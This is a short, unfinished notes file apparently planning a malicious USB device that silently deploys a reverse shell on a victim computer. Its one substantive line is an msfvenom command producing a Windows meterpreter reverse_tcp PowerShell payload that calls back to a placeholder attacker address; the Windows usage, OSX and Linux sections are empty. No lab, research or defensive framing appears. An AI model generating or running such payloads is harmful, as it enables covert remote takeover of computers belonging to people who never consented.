# Objective

Create a usb which deploys a reverse shell in a computer without user interaction and as fast as possible

# Payload creation

# Windows

For creating a 32-bit payload that works in both 32-bit and 64-bit windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f psh LHOST="<IP>" LPORT=1337 -o <filename.ps1>
```

For using it in Windows:

```bash
```

# OSX

# Linux
